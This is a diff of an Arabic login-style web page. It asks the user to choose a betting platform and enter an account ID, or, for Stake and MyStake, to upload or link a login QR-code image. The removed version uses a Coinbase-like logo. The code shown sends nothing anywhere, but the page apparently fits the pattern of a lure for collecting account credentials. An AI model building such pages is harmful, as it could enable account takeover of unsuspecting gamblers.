@@ -2,196 +2,88 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#0052FF">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>تسجيل الدخول</title>
 <style>
-  :root{--blue:#0052ff;--ink:#0f172a;--muted:#5b6472;--line:#d5dbe5;--card:#ffffff}
-  *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%}
-  body{font-family:Inter,system-ui,-apple-system,Segoe UI,Tahoma,Arial,sans-serif;background:#fff;color:var(--ink)}
-  .sysbar{position:fixed;top:0;left:0;right:0;height:env(safe-area-inset-top, 0px);background:#0052ff;z-index:10;pointer-events:none}
-  .shell{max-width:400px;margin:0 auto;padding:calc(env(safe-area-inset-top, 0px) + 16px) 18px 24px}
-  .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
-  .mark{width:36px;height:36px}
-  .link{color:#0052ff;font-weight:600;text-decoration:none}
-  .card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:20px}
-  .title{font-size:20px;font-weight:700;margin-bottom:16px}
-  .group{margin-bottom:14px}
-  .label{display:block;font-size:14px;font-weight:600;color:#1f2937;margin-bottom:8px}
-  .field{width:100%;height:48px;border:1px solid var(--line);border-radius:8px;background:#fff;color:var(--ink);font-size:15px;padding:0 12px;outline:none}
-  select.field{appearance:none;-webkit-appearance:none;background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>');background-repeat:no-repeat;background-position:left 12px center;padding-left:36px}
-  .btn{width:100%;height:48px;border:0;border-radius:8px;background:#0052ff;color:#fff;font-weight:600;font-size:15px;cursor:pointer}
-  .btn[disabled]{opacity:.6;cursor:not-allowed}
-  .fine{font-size:12px;color:var(--muted);line-height:1.6;margin-top:14px;text-align:center}
-  .fine a{color:#0052ff;text-decoration:none}
-  /* QR UI */
-  .qr-card{border:1px solid var(--line);border-radius:12px;background:#fff;padding:14px}
-  .qr-options{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
-  .qr-options button{flex:1;min-width:100px;padding:8px;border:none;border-radius:8px;cursor:pointer;font-size:13px;background:#f1f5f9;color:#111}
-  .qr-preview{display:none;text-align:center;margin-top:8px}
-  .qr-preview img{max-width:100%;height:auto;border-radius:8px;border:1px solid var(--line)}
-  .qr-result{margin-top:8px;font-size:13px;text-align:center}
-  .qr-result a{color:#0052ff;text-decoration:none;word-break:break-all}
-  .qr-btns{display:flex;gap:8px;justify-content:center;margin-top:6px}
-  .qr-btns button{padding:6px 10px;border:none;border-radius:6px;font-size:12px;cursor:pointer}
-  .open{background:#0052ff;color:#fff}
-  .copy{background:#e5e7eb;color:#111}
+  body{margin:0;font-family:sans-serif;background:#f5f5f5;color:#111;direction:rtl}
+  header{background:#0052ff;color:#fff;padding:14px;text-align:center;font-weight:bold}
+  .container{max-width:400px;margin:30px auto;background:#fff;padding:20px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
+  label{display:block;margin-bottom:6px;font-weight:bold}
+  select,input,button{width:100%;padding:10px;margin-bottom:14px;border:1px solid #ccc;border-radius:8px;font-size:15px}
+  button{background:#0052ff;color:#fff;border:none;cursor:pointer}
+  .qr-box{border:1px solid #ddd;padding:15px;border-radius:10px;background:#f9f9f9}
+  .qr-options{display:flex;gap:10px;margin-top:10px}
+  .qr-options button{flex:1;background:#e9eaeb;color:#111;border:none;border-radius:8px;cursor:pointer;padding:10px}
 </style>
 </head>
 <body>
 
-<div class="sysbar"></div>
+<header>منصة الدخول</header>
 
-<div class="shell">
-  <div class="top">
-    <svg class="mark" viewBox="0 0 36 36"><circle cx="18" cy="18" r="18" fill="#0052ff"/><path d="M23.7 20.7a6.4 6.4 0 1 1 0-5.4h3.67a9.99 9.99 0 1 0 0 5.4H23.7z" fill="#fff"/></svg>
-    <a class="link" href="#">Sign up</a>
+<div class="container">
+  <label for="platform">اختر المنصة</label>
+  <select id="platform">
+    <option value="">-- اختر --</option>
+    <option value="stake">STAKE</option>
+    <option value="mystake">MYSTAKE</option>
+    <option value="1xbet">1XBET</option>
+    <option value="linebet">LINEBET</option>
+    <option value="melbet">MELBET</option>
+  </select>
+
+  <div id="id-section">
+    <label for="userid">أدخل الـ ID</label>
+    <input type="text" id="userid" placeholder="اكتب الـ ID هنا">
   </div>
 
-  <div class="card">
-    <div class="title">تسجيل الدخول</div>
-
-    <div class="group">
-      <span class="label">اختر المنصة</span>
-      <select id="platform" class="field">
-        <option value="" selected disabled>اختر المنصة</option>
-        <option>LINEBET</option>
-        <option>1XBET</option>
-        <option>MELBET</option>
-        <option>MEGAPARI</option>
-        <option>STAKE</option>
-        <option>MYSTAKE</option>
-        <option>GOOOBET</option>
-        <option>RISCOBET</option>
-        <option>888STARZ</option>
-      </select>
-    </div>
-
-    <div id="idGroup" class="group">
-      <span class="label">أدخل الـ ID</span>
-      <input id="uid" class="field" type="text" inputmode="numeric" pattern="[0-9]{4,15}" maxlength="15" placeholder="مثال: 1234567">
-    </div>
-
-    <div id="qrGroup" class="group qr-card" style="display:none;">
+  <div id="qr-section" style="display:none;">
+    <label for="qrLink">رابط الكود</label>
+    <input type="text" id="qrLink" placeholder="هنا يظهر أو اكتب الرابط">
+    <div class="qr-box">
       <div class="qr-options">
         <button id="uploadBtn">📁 تحميل صورة</button>
-        <button id="cameraBtn">📷 الكاميرا</button>
         <button id="linkBtn">🔗 إدخال رابط</button>
       </div>
       <input type="file" id="fileInput" accept="image/*" style="display:none;">
-      <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none;">
-      <div class="qr-preview">
-        <img id="qrImage" src="" alt="QR Preview">
-      </div>
-      <div class="qr-result" id="qrLinkText">لم يتم إدخال صورة بعد</div>
-      <div class="qr-btns" style="display:none;" id="qrBtns">
-        <button class="open" id="openLink">فتح</button>
-        <button class="copy" id="copyLink">نسخ</button>
-      </div>
     </div>
-
-    <button id="go" class="btn" disabled>متابعة</button>
-
-    <div class="fine">باستمرارك، فإنك توافق على <a href="#">سياسة الخصوصية</a> و<a href="#">سياسة ملفات الارتباط</a>.</div>
   </div>
+
+  <button id="submitBtn">تأكيد</button>
 </div>
 
-<script src="https://unpkg.com/@zxing/library@latest"></script>
 <script>
-const platform=document.getElementById('platform'),
-      uid=document.getElementById('uid'),
-      go=document.getElementById('go'),
-      idGroup=document.getElementById('idGroup'),
-      qrGroup=document.getElementById('qrGroup'),
-      uploadBtn=document.getElementById('uploadBtn'),
-      cameraBtn=document.getElementById('cameraBtn'),
-      linkBtn=document.getElementById('linkBtn'),
-      fileInput=document.getElementById('fileInput'),
-      cameraInput=document.getElementById('cameraInput'),
-      qrPreview=document.querySelector('.qr-preview'),
-      qrImage=document.getElementById('qrImage'),
-      qrLinkText=document.getElementById('qrLinkText'),
-      qrBtns=document.getElementById('qrBtns'),
-      openBtn=document.getElementById('openLink'),
-      copyBtn=document.getElementById('copyLink');
+  const platform=document.getElementById('platform');
+  const idSection=document.getElementById('id-section');
+  const qrSection=document.getElementById('qr-section');
+  const fileInput=document.getElementById('fileInput');
+  const qrLink=document.getElementById('qrLink');
+  const uploadBtn=document.getElementById('uploadBtn');
+  const linkBtn=document.getElementById('linkBtn');
 
-platform.addEventListener('change',()=>{
-  if(platform.value==='STAKE'||platform.value==='MYSTAKE'){
-    idGroup.style.display='none';
-    qrGroup.style.display='block';
-    go.disabled=true;
-  }else{
-    qrGroup.style.display='none';
-    idGroup.style.display='block';
-    validate();
-  }
-});
-
-uid.addEventListener('input',validate);
-function validate(){
-  const okP=platform.value && platform.value!=='';
-  const okId=/^[0-9]{4,15}$/.test(uid.value.trim());
-  go.disabled=!(okP && okId);
-}
-
-uploadBtn.onclick=()=>fileInput.click();
-cameraBtn.onclick=()=>cameraInput.click();
-linkBtn.onclick=()=>{
-  const url=prompt("أدخل رابط صورة QR:");
-  if(url){setQRImage(url);}
-};
-fileInput.onchange=e=>{
-  if(e.target.files[0]){
-    const url=URL.createObjectURL(e.target.files[0]);
-    setQRImage(url);
-  }
-};
-cameraInput.onchange=e=>{
-  if(e.target.files[0]){
-    const url=URL.createObjectURL(e.target.files[0]);
-    setQRImage(url);
-  }
-};
-
-function setQRImage(src){
-  qrImage.src=src;
-  qrPreview.style.display='block';
-  qrLinkText.textContent="جاري قراءة الكود...";
-  qrBtns.style.display='none';
-  readQR(src);
-}
-
-async function readQR(src){
-  try{
-    const codeReader=new ZXing.BrowserQRCodeReader();
-    const blob=await fetch(src).then(r=>r.blob());
-    const dataUrl=await blobToDataURL(blob);
-    const decoded=await codeReader.decodeFromImage(undefined, dataUrl);
-    if(decoded && decoded.text){
-      qrLinkText.innerHTML=`<a href="${decoded.text}" target="_blank">${decoded.text}</a>`;
-      qrBtns.style.display='flex';
-      openBtn.onclick=()=>window.open(decoded.text,'_blank');
-      copyBtn.onclick=()=>{navigator.clipboard.writeText(decoded.text);copyBtn.textContent='تم النسخ ✅';setTimeout(()=>copyBtn.textContent='نسخ',1500);};
-      go.disabled=false;
+  platform.addEventListener('change',()=>{
+    if(platform.value==="stake" || platform.value==="mystake"){
+      idSection.style.display="none";
+      qrSection.style.display="block";
     }else{
-      qrLinkText.textContent="تعذر قراءة الكود ❌";
+      idSection.style.display="block";
+      qrSection.style.display="none";
     }
-  }catch(e){
-    qrLinkText.textContent="تعذر قراءة الكود ❌";
-  }
-}
-
-function blobToDataURL(blob){
-  return new Promise((resolve,reject)=>{
-    const reader=new FileReader();
-    reader.onload=()=>resolve(reader.result);
-    reader.onerror=reject;
-    reader.readAsDataURL(blob);
   });
-}
+
+  uploadBtn.addEventListener('click',()=>{
+    fileInput.click();
+  });
+
+  fileInput.addEventListener('change',()=>{
+    if(fileInput.files.length>0){
+      qrLink.value=fileInput.files[0].name; // فقط اسم الملف
+    }
+  });
+
+  linkBtn.addEventListener('click',()=>{
+    const userLink=prompt("أدخل رابط الصورة:");
+    if(userLink) qrLink.value=userLink;
+  });
 </script>
 
 </body>
